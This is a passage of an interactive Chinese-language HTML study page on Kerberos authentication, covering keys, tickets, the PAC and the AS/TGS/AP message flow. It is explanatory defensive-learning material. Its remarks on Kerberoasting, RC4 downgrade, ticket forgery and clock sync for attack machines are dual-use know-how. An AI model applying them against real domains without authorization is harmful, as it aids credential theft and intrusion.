      <li><b>AP (Application Server)</b>：提供用户所需服务的服务器。</li>
      <li><b>KDC (Key Distribution Center)</b>：Kerberos 的核心服务，负责颁发票据，安装在 DC（Domain Controller）上。它由 <b>AS (Authentication Service)</b> 与 <b>TGS (Ticket Granting Service)</b> 组成，其中 AS 用于颁发 TGT。</li>
    </ul>
    <div class="callout">
      <span class="lbl">命名陷阱</span>
      <b>AP</b> 取自消息名 <kbd>KRB_AP_REQ</kbd>（AP = Application 交换），并非 "Application Server" 的逐字母缩写——因为 "AS" 已被 Authentication Service 占用。同理 <b>TGS</b> 一词身兼两职：既指 KDC 里的"票据授予服务（角色）"，也指它签发的"服务票据（Service Ticket / ST）"。
    </div>
  </div>
</section>

<!-- 加密密钥 -->
<section id="keys">
  <div class="wrap">
    <div class="sec-no">SECTION 02 · 3</div>
    <h2>加密密钥 <span class="en">// encryption keys</span></h2>
    <p>Kerberos 会处理许多结构（如票据），其中许多都经过加密或签名以防篡改。点击任意密钥卡片可高亮——后面流程图中相同颜色即代表同一把钥匙。</p>

    <div class="keygrid" id="keygrid">
      <div class="keycard" style="--c:var(--key-kdc)">
        <div class="nm"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>KDC / krbtgt key</div>
        <div class="ds">源自 <code>krbtgt</code> 账户口令（RC4 下即其 NTLM 哈希）。用于加密 TGT、签名 PAC。</div>
      </div>
      <div class="keycard" style="--c:var(--key-user)">
        <div class="nm"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>User key</div>
        <div class="ds">源自用户自身口令。也称"客户端密钥 / client key"，二者同指一把。</div>
      </div>
      <div class="keycard" style="--c:var(--key-svc)">
        <div class="nm"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>Service key</div>
        <div class="ds">源自服务所有者（用户账户或计算机账户）的口令。用于加密 TGS。</div>
      </div>
      <div class="keycard" style="--c:var(--key-sess)">
        <div class="nm"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 2v4M12 18v4M2 12h4M18 12h4"/></svg>Session key</div>
        <div class="ds">由用户和 KDC 协商生成（临时），用于 Client 与 KDC 之间。</div>
      </div>
      <div class="keycard" style="--c:var(--key-ssess)">
        <div class="nm"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 2v4M12 18v4M2 12h4M18 12h4"/></svg>Service session key</div>
        <div class="ds">临时密钥，用于用户和服务之间（Client ↔ AP）。</div>
      </div>
    </div>

    <div class="callout warn" style="margin-top:24px">
      <span class="lbl">关键修正：长期密钥 ≠ 永远是 NTLM 哈希</span>
      上述 key 本质都是账户的<strong>长期密钥</strong>，其派生方式取决于协商的加密类型（etype）。现代 AD（域功能级别 2008+）默认协商 <strong>AES</strong>，此时密钥与 NTLM 哈希无关。切换下方标签查看差异——它直接影响金票据、Kerberoasting 的可行性与隐蔽性。
    </div>

    <div class="etype-box">
      <div class="etype-tabs">
        <button class="on" data-et="rc4">RC4-HMAC · etype 23</button>
        <button data-et="aes">AES128/256 · etype 17/18</button>
      </div>
      <div class="etype-body">
        <div class="etype-stage">
          <div class="t">输入</div>
          <div class="v">账户明文口令</div>
        </div>
        <div class="etype-arrow" id="etArrow">
          ──▶
          <span class="fn" id="etFn">MD4()</span>
        </div>
        <div class="etype-stage">
          <div class="t">长期密钥</div>
          <div class="v" id="etOut">NTLM 哈希</div>
        </div>
      </div>
      <div class="etype-note" id="etNote">
        <b>RC4 下：</b>长期密钥 <b>等于</b>账户口令的 NTLM 哈希。RC4 加密的票据离线爆破远快，攻击方常主动"降级"请求 RC4；但在 AES 默认环境里，纯 RC4 票据属异常信号、易被检测。
      </div>
    </div>
  </div>
</section>

<!-- 票据 -->
<section id="tickets">
  <div class="wrap">
    <div class="sec-no">SECTION 02 · 4</div>
    <h2>票据 <span class="en">// tickets</span></h2>
    <p>票据是 Kerberos 处理的核心结构，交付给用户以便其在 Kerberos 领域（Realm）中执行操作。<strong>点击下方票据可展开，查看其内部字段与"哪把钥匙能解开它"。</strong></p>

    <div class="tickets">
      <div class="ticket" style="--tc:var(--key-kdc)" onclick="this.classList.toggle('open')">
        <div class="thd">
          <span class="nm">TGT</span>
          <span class="en">Ticket Granting Ticket</span>
        </div>
        <div class="lockbar"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg> 由 KDC / krbtgt key 加密 — 仅 KDC 能解</div>
        <div class="body">
          <ul>
            <li><span class="dot" style="background:var(--key-svc)"></span>Username</li>
            <li><span class="dot" style="background:var(--key-sess)"></span>Session key</li>
            <li><span class="dot" style="background:var(--ink-faint)"></span>TGT 到期日期</li>
            <li><span class="dot" style="background:var(--key-kdc)"></span>PAC（由 KDC 签名，含 SID / 组成员）</li>
          </ul>
          <div class="hint">用途：出示给 KDC 以请求 TGS。生命周期默认 ~10h，可续订(renewable)至 7 天。</div>
        </div>
      </div>

      <div class="ticket" style="--tc:var(--key-svc)" onclick="this.classList.toggle('open')">
        <div class="thd">
          <span class="nm">TGS / ST</span>
          <span class="en">Service Ticket</span>
        </div>
        <div class="lockbar"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg> 由 Service key 加密 — 仅目标服务能解</div>
        <div class="body">
          <ul>
            <li><span class="dot" style="background:var(--key-ssess)"></span>Service session key</li>
            <li><span class="dot" style="background:var(--key-svc)"></span>Username</li>
            <li><span class="dot" style="background:var(--ink-faint)"></span>TGS 到期日期</li>
            <li><span class="dot" style="background:var(--key-kdc)"></span>PAC（由 KDC 签名）</li>
          </ul>
          <div class="hint">用途：向某个具体服务进行身份验证。这正是 Kerberoasting 离线爆破的对象。</div>
        </div>
      </div>
    </div>

    <h3 style="margin-top:46px"><span class="idx">5</span>PAC</h3>
    <p><strong>PAC (Privilege Attribute Certificate)</strong> 是几乎包含在每个票据中的结构，含用户权限信息（SID、组成员关系等）。</p>
    <div class="callout warn">
      <span class="lbl">PAC 并非只由 "KDC 密钥" 签名</span>
      历史上包含两个签名：<b>Server Signature</b>（由 Service key 签名）与 <b>KDC Signature</b>（由 krbtgt key 签名）。微软在 <b>2021 年 11 月补丁</b>后引入 PAC_REQUESTOR 与 Ticket Signature 等新字段对抗票据伪造（削弱了金票据、银票据及 noPac 的传统利用），也使得"无 krbtgt 密钥便无法正确签名 PAC"在加固环境中更成立。
    </div>
    <p>服务可以通过与 KDC 通信来验证 PAC，但这并不经常发生；即便验证，通常也仅检查签名，而不校验 PAC 内部权限是否正确。此外，客户端可在票据请求的 <kbd>KERB-PA-PAC-REQUEST</kbd> 字段中指定，以避免在票据中包含 PAC。</p>

    <h3 style="margin-top:40px"><span class="idx">6</span>消息（Messages）</h3>
    <table class="msgtable">
      <tr><th>消息</th><th>作用</th></tr>
      <tr><td>KRB_AS_REQ</td><td>向 KDC 请求 TGT。</td></tr>
      <tr><td>KRB_AS_REP</td><td>KDC 交付 TGT。</td></tr>
      <tr><td>KRB_TGS_REQ</td><td>使用 TGT 向 KDC 请求 TGS。</td></tr>
      <tr><td>KRB_TGS_REP</td><td>KDC 交付 TGS。</td></tr>
      <tr><td>KRB_AP_REQ</td><td>使用 TGS 向某个服务进行身份验证。</td></tr>
      <tr><td>KRB_AP_REP</td><td>（可选）服务向用户表明自身身份（双向认证）。</td></tr>
      <tr><td>KRB_ERROR</td><td>沟通错误状态的消息。</td></tr>
    </table>
  </div>
</section>

<!-- 三、FLOW -->
<section id="flow">
  <div class="wrap">
    <div class="sec-no">SECTION 03</div>
    <h2>身份验证流程 <span class="en">// authentication flow</span></h2>
    <p class="lead">从一个没有票据的用户开始，直到成功在目标服务上通过身份验证。点击 <b>下一步</b> 或 <b>播放</b>，观察每条消息在 User / KDC / AP 之间流动，并展开其内部字段——<strong>每个字段右侧的彩色锁标明"用哪把钥匙加密"</strong>。</p>

    <div class="flow">
      <div class="flow-top">
        <div class="stage" id="stage">
          <svg class="tri" id="tri" preserveAspectRatio="none">
            <defs>
              <marker id="ah" markerWidth="7" markerHeight="7" refX="6.5" refY="3" orient="auto" markerUnits="userSpaceOnUse">
                <path d="M0,0 L7,3 L0,6 Z"/>
              </marker>
            </defs>
            <line class="edge" id="eUK"></line>
            <line class="edge" id="eUA"></line>
            <line class="edge dashed" id="eKA"></line>
            <line class="arrow" id="arrow" marker-end="url(#ah)"></line>
          </svg>
          <div class="edgelabel" style="left:30%;top:39%">AS · TGS</div>
          <div class="edgelabel" style="left:70%;top:39%">AP</div>
          <div class="edgelabel" style="left:50%;top:62%;opacity:.7">PAC 验证(可选)</div>
          <div class="tnode" id="nUser" style="left:50%;top:15%"><div class="box">USER</div><div class="role">CLIENT</div></div>
          <div class="tnode" id="nKdc" style="left:16%;top:62%"><div class="box">KDC</div><div class="role">AS + TGS · on DC</div></div>
          <div class="tnode" id="nAp" style="left:84%;top:62%"><div class="box">AP</div><div class="role">APP SERVER</div></div>
          <div class="packet" id="pkt"></div>
        </div>

        <div class="detail">
          <div class="step-no" id="dStep">STEP 0 / 6</div>
          <div class="msg" id="dMsg">准备就绪</div>
          <div class="dir" id="dDir">User 当前没有任何票据</div>
          <div class="desc" id="dDesc">点击「播放」或「下一步」开始。整个流程分为三段：AS 交换（拿 TGT）→ TGS 交换（拿服务票据）→ AP 交换（向服务认证）。</div>
          <div class="fields" id="dFields"></div>
        </div>
      </div>

      <div class="controls">
        <button id="btnPrev">◀ 上一步</button>
        <button id="btnNext" class="primary">下一步 ▶</button>
        <button id="btnPlay">⏵ 播放</button>
        <button id="btnReset">↺ 重置</button>
        <div class="steptrack" id="track"></div>
      </div>
    </div>

    <div class="callout" style="margin-top:24px">
      <span class="lbl">两步解密：AP 如何读懂消息</span>
      在最后一步，AP 先用<b>自己的 Service key</b> 解开 TGS、<b>从中取出 Service session key</b>，再用这把临时密钥解开 Authenticator（含时间戳）。"长期密钥开票 → 取出会话密钥 → 会话密钥验人"——这正是服务端在<strong>不预先知道会话密钥</strong>的情况下完成验证的巧妙之处。
    </div>
    <div class="callout warn">
      <span class="lbl">实战提醒：时间同步</span>
      流程中多处依赖<strong>时间戳防重放</strong>，默认只容忍 <b>5 分钟（MaxClockSkew）</b>偏差。攻击机若与 DC 时钟不同步，会触发 <kbd>KRB_AP_ERR_SKEW</kbd>。凡走 Kerberos / 操作票据前，先 <code>ntpdate &lt;DC&gt;</code> 同步到 DC。
    </div>
  </div>
</section>

<footer>
  <div class="wrap">
    <b>Kerberos · 交互式学习笔记</b><br>
    内容据个人 PDF 笔记整理重排，术语已校正 · 仅用于授权范围内的学习与测试
  </div>
</footer>

<script>
/* ============ etype toggle ============ */
const etData={
  rc4:{fn:'NTLM(MD4)',out:'NTLM 哈希',note:'<b>RC4 下：</b>长期密钥 <b>等于</b>账户口令的 NTLM 哈希。RC4 加密的票据离线爆破远快，攻击方常主动"降级"请求 RC4；但在 AES 默认环境里，纯 RC4 票据属异常信号、易被检测。',col:'var(--key-kdc)'},
  aes:{fn:'string2key()',out:'AES128 / AES256 key',note:'<b>AES 下：</b>长期密钥经 <b>string2key</b>（基于 PBKDF2，带 salt，salt 通常为 <code>域名+用户名</code>）从明文口令派生，<b>与 NTLM 哈希无关</b>。AES 票据爆破慢得多，是抬高 Kerberoasting 成本的关键防御。',col:'var(--key-ssess)'}
};
document.querySelectorAll('.etype-tabs button').forEach(b=>{
  b.onclick=()=>{
    document.querySelectorAll('.etype-tabs button').forEach(x=>x.classList.remove('on'));
    b.classList.add('on');
    const d=etData[b.dataset.et];
    document.getElementById('etFn').textContent=d.fn;
    const out=document.getElementById('etOut');out.textContent=d.out;out.style.color=d.col;
    document.getElementById('etNote').innerHTML=d.note;
  };
});

/* ============ key card highlight ============ */
document.querySelectorAll('.keycard').forEach(c=>{
  c.onclick=()=>{c.classList.toggle('selected');};
});

/* ============ FLOW PLAYER ============ */
const K={user:'var(--key-user)',kdc:'var(--key-kdc)',svc:'var(--key-svc)',sess:'var(--key-sess)',ssess:'var(--key-ssess)',none:'var(--ink-faint)'};
const KN={user:'User key',kdc:'KDC/krbtgt key',svc:'Service key',sess:'Session key',ssess:'Service session key',none:'明文'};
const lockSVG='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>';

const STEPS=[
 {msg:'KRB_AS_REQ',from:'user',to:'kdc',pkt:'pkt1',cls:'req',
  dir:'USER ──▶ KDC（AS）',
  desc:'用户必须先从 KDC 获取 TGT。注意：加密时间戳仅在需要预认证(Preauthentication)时存在——这是常见配置，除非账户设了 DONT_REQ_PREAUTH 标志。',
  fields:[
    {n:'Timestamp（时间戳）',k:'user',sub:[]},
    {n:'Username',k:'none',sub:[]},
    {n:'SPN（krbtgt 账户）',k:'none',sub:[]},
    {n:'User nonce（随机数）',k:'none',sub:[]}
  ]},
 {msg:'KRB_AS_REP',from:'kdc',to:'user',pkt:'pkt1',cls:'rep',
  dir:'KDC（AS）──▶ USER',
  desc:'KDC 通过解密时间戳验证用户身份，正确则交付 TGT。注意 TGT 被 krbtgt key 锁住（用户拿不到也看不懂），而另一份数据用 User key 锁住（只有用户能解）。',
  fields:[
    {n:'Username',k:'none',sub:[]},
    {n:'TGT',k:'kdc',sub:['Username','Session key','TGT 到期日期','PAC（KDC 签名）']},
    {n:'加密数据块',k:'user',sub:['Session key','TGT 到期日期','User nonce']}
  ]},
 {msg:'KRB_TGS_REQ',from:'user',to:'kdc',pkt:'pkt1',cls:'req',
  dir:'USER ──▶ KDC（TGS）',
  desc:'用户持 TGT 向 KDC 请求访问某服务的票据。Authenticator 用上一步拿到的 Session key 加密；TGT 实际以 AP-REQ 形式置于 padata 中。',
  fields:[
    {n:'Authenticator',k:'sess',sub:['Username','Timestamp']},
    {n:'TGT',k:'kdc',sub:['（沿用上一步，仅 KDC 能解）']},
    {n:'所请求服务的 SPN',k:'none',sub:[]},
    {n:'User nonce',k:'none',sub:[]}
  ]},
 {msg:'KRB_TGS_REP',from:'kdc',to:'user',pkt:'pkt1',cls:'rep',
  dir:'KDC（TGS）──▶ USER',
  desc:'KDC 据 SPN 找到服务账户的长期密钥，用它加密 TGS 后返回。TGS 被 Service key 锁住（只有目标服务能解），另一份用 Session key 锁住给用户。',
  fields:[
    {n:'Username',k:'none',sub:[]},
    {n:'TGS',k:'svc',sub:['Service session key','Username','TGS 到期日期','PAC（KDC 签名）']},
    {n:'加密数据块',k:'sess',sub:['Service session key','TGS 到期日期','User nonce']}
  ]},
 {msg:'KRB_AP_REQ',from:'user',to:'ap',pkt:'pkt2',cls:'req',
  dir:'USER ──▶ AP',
  desc:'用户向应用服务器出示 TGS 并附上 Authenticator。AP 先用自己的 Service key 解开 TGS、取出 Service session key，再用它解开 Authenticator 验证用户身份。',
  fields:[
    {n:'TGS',k:'svc',sub:['（AP 用 Service key 解开，取出 Service session key）']},
    {n:'Authenticator',k:'ssess',sub:['Username','Timestamp（防重放）']}
  ]},
 {msg:'KRB_AP_REP',from:'ap',to:'user',pkt:'pkt2',cls:'rep',
  dir:'AP ──▶ USER（可选）',
  desc:'权限正确即可访问服务。若需双向认证(Mutual Authentication)，服务用 KRB_AP_REP 向用户证明自身身份。某些情况下 AP 还会经 Netlogon 向 KDC 验证 PAC。',
  fields:[
    {n:'加密时间戳',k:'ssess',sub:['证明 AP 确实持有 Service session key']}
  ]}
];

let cur=0,playing=false,timer=null,curStep=null;
const nodes={user:document.getElementById('nUser'),kdc:document.getElementById('nKdc'),ap:document.getElementById('nAp')};
const stage=document.getElementById('stage');
const svg=document.getElementById('tri');
const arrow=document.getElementById('arrow');
const pkt=document.getElementById('pkt');
const track=document.getElementById('track');
STEPS.forEach((_,i)=>{const i2=document.createElement('i');i2.onclick=()=>{stopPlay();render(i+1)};track.appendChild(i2);});

function nodeRect(key){
  const s=stage.getBoundingClientRect();
  const box=nodes[key].querySelector('.box');
  const r=box.getBoundingClientRect();
  return {left:r.left-s.left,top:r.top-s.top,w:r.width,h:r.height,
    cx:r.left-s.left+r.width/2,cy:r.top-s.top+r.height/2};
}
function port(r, where){
  if(where==='top') return {x:r.cx,y:r.top};
  if(where==='bottom') return {x:r.cx,y:r.top+r.h};
  if(where==='left') return {x:r.left,y:r.cy};
  if(where==='right') return {x:r.left+r.w,y:r.cy};
  return {x:r.cx,y:r.cy};
}
function rawConnection(fromKey,toKey){
  const rf=nodeRect(fromKey), rt=nodeRect(toKey);
  // Use explicit visual ports instead of automatic rectangle clipping.
  // This prevents the KDC -> User reply arrow from appearing shifted toward the side of the USER box.
  if(fromKey==='user' && toKey==='kdc') return {from:port(rf,'bottom'),to:port(rt,'top')};
  if(fromKey==='kdc' && toKey==='user') return {from:port(rf,'top'),to:port(rt,'bottom')};
  if(fromKey==='user' && toKey==='ap') return {from:port(rf,'bottom'),to:port(rt,'top')};
  if(fromKey==='ap' && toKey==='user') return {from:port(rf,'top'),to:port(rt,'bottom')};
  if(fromKey==='kdc' && toKey==='ap') return {from:port(rf,'right'),to:port(rt,'left')};
  if(fromKey==='ap' && toKey==='kdc') return {from:port(rf,'left'),to:port(rt,'right')};
  return {from:port(rf,'center'),to:port(rt,'center')};
}
function shorten(from,to,startGap=0,endGap=0){
  const dx=to.x-from.x,dy=to.y-from.y;
  const L=Math.hypot(dx,dy)||1;
  return {
    from:{x:from.x+dx/L*startGap,y:from.y+dy/L*startGap},
    to:{x:to.x-dx/L*endGap,y:to.y-dy/L*endGap}
  };
}
function setLine(id,p,q){const l=document.getElementById(id);l.setAttribute('x1',p.x);l.setAttribute('y1',p.y);l.setAttribute('x2',q.x);l.setAttribute('y2',q.y);}

function layout(){
  const s=stage.getBoundingClientRect();
  svg.setAttribute('viewBox','0 0 '+s.width+' '+s.height);
  let c=rawConnection('user','kdc'); setLine('eUK',c.from,c.to);
  c=rawConnection('user','ap'); setLine('eUA',c.from,c.to);
  c=rawConnection('kdc','ap'); setLine('eKA',c.from,c.to);
  if(curStep) drawArrow(curStep,false);
}
function drawArrow(s,fly){
  const c=rawConnection(s.from,s.to);
  const line=shorten(c.from,c.to,7,7);
  arrow.setAttribute('x1',line.from.x);arrow.setAttribute('y1',line.from.y);
  arrow.setAttribute('x2',line.to.x);arrow.setAttribute('y2',line.to.y);
  arrow.style.stroke=(s.cls==='req'?'var(--key-svc)':'var(--key-ssess)');
  document.querySelector('#ah path').style.fill=(s.cls==='req'?'var(--key-svc)':'var(--key-ssess)');
  arrow.classList.add('on');
  if(fly){
    const pktLine=shorten(c.from,c.to,24,24);
    pkt.textContent=s.msg;pkt.className='packet '+s.cls;
    pkt.style.transition='none';pkt.style.left=pktLine.from.x+'px';pkt.style.top=pktLine.from.y+'px';
    void pkt.offsetWidth;pkt.style.transition='';
    requestAnimationFrame(()=>{pkt.classList.add('show');pkt.style.left=pktLine.to.x+'px';pkt.style.top=pktLine.to.y+'px';});
  }
}
function setNode(active){Object.values(nodes).forEach(n=>n.classList.remove('active'));if(active)nodes[active]&&nodes[active].classList.add('active');}

function render(n){
  cur=n;
  const prev=document.getElementById('btnPrev'),next=document.getElementById('btnNext');
  prev.disabled=(n===0);next.disabled=(n>=STEPS.length);
  [...track.children].forEach((el,i)=>{el.className=(i<n-1?'done':'')+(i===n-1?' cur':'');});
  pkt.classList.remove('show');

  if(n===0){
    curStep=null;arrow.classList.remove('on');
    document.getElementById('dStep').textContent='STEP 0 / 6';
    document.getElementById('dMsg').textContent='准备就绪';
    document.getElementById('dMsg').style.color='var(--ink-dim)';
    document.getElementById('dDir').textContent='User 当前没有任何票据';
    document.getElementById('dDesc').textContent='点击「播放」或「下一步」开始。整个流程分为三段：AS 交换（拿 TGT）→ TGS 交换（拿服务票据）→ AP 交换（向服务认证）。';
    document.getElementById('dFields').innerHTML='';
    setNode(null);
    return;
  }
  const s=STEPS[n-1];curStep=s;
  document.getElementById('dStep').textContent='STEP '+n+' / '+STEPS.length;
  const m=document.getElementById('dMsg');m.textContent=s.msg;m.style.color='var(--accent)';
  document.getElementById('dDir').textContent=s.dir;
  document.getElementById('dDesc').textContent=s.desc;

  const fc=document.getElementById('dFields');fc.innerHTML='';
  s.fields.forEach((f,i)=>{
    const col=K[f.k];
    const div=document.createElement('div');div.className='field';div.style.animationDelay=(i*70)+'ms';
    let inner='';
    if(f.sub.length){inner='<div class="inner">'+f.sub.map(x=>'<span>'+x+'</span>').join('')+'</div>';}
    const lock=f.k==='none'
      ? '<span class="lock" style="color:var(--ink-faint);border:1px dashed var(--line2)" title="未加密">明文</span>'
      : '<span class="lock" style="color:'+col+';background:color-mix(in srgb,'+col+' 16%,transparent)" title="用 '+KN[f.k]+' 加密">'+lockSVG+KN[f.k]+'</span>';
    div.innerHTML='<div class="fh">'+f.n+lock+'</div>'+inner;
    fc.appendChild(div);
  });

  // animate along triangle edge with directional arrow
  setNode(s.from);
  drawArrow(s,true);
  setTimeout(()=>{setNode(s.to);},620);
}

function next(){if(cur<STEPS.length)render(cur+1);}
function prev(){if(cur>0)render(cur-1);}
function stopPlay(){playing=false;clearInterval(timer);document.getElementById('btnPlay').textContent='⏵ 播放';}
function play(){
  if(playing){stopPlay();return;}
  if(cur>=STEPS.length)render(0);
  playing=true;document.getElementById('btnPlay').textContent='⏸ 暂停';
  timer=setInterval(()=>{
    if(cur>=STEPS.length){stopPlay();return;}
    next();
  },2300);
}
document.getElementById('btnNext').onclick=()=>{stopPlay();next();};
document.getElementById('btnPrev').onclick=()=>{stopPlay();prev();};
document.getElementById('btnPlay').onclick=play;
document.getElementById('btnReset').onclick=()=>{stopPlay();render(0);};
layout();render(0);
window.addEventListener('resize',layout);
window.addEventListener('load',layout);
setTimeout(layout,300); // re-measure after webfonts load

/* ============ nav scrollspy ============ */
const navLinks=[...document.querySelectorAll('.nav a')];
const secs=navLinks.map(a=>document.querySelector(a.getAttribute('href')));
const io=new IntersectionObserver(es=>{
  es.forEach(e=>{if(e.isIntersecting){
    const id='#'+e.target.id;navLinks.forEach(a=>a.classList.toggle('on',a.getAttribute('href')===id));
  }});
},{rootMargin:'-45% 0px -45% 0px'});
secs.forEach(s=>s&&io.observe(s));

/* ============ theme toggle (system / light / dark) ============ */
const THEMES=[{k:'system',i:'◐',l:'系统'},{k:'light',i:'☀',l:'亮色'},{k:'dark',i:'☾',l:'暗色'}];
let ti=0;
function applyTheme(){
  const m=THEMES[ti];
  if(m.k==='system') document.documentElement.removeAttribute('data-theme');
  else document.documentElement.setAttribute('data-theme',m.k);
  document.getElementById('themeIco').textContent=m.i;
  document.getElementById('themeLbl').textContent=m.l;
  if(typeof layout==='function') layout(); // recolor arrow/edges under new vars
}
document.getElementById('themeBtn').onclick=()=>{ti=(ti+1)%THEMES.length;applyTheme();};
applyTheme();
</script>
</body>
</html>
```
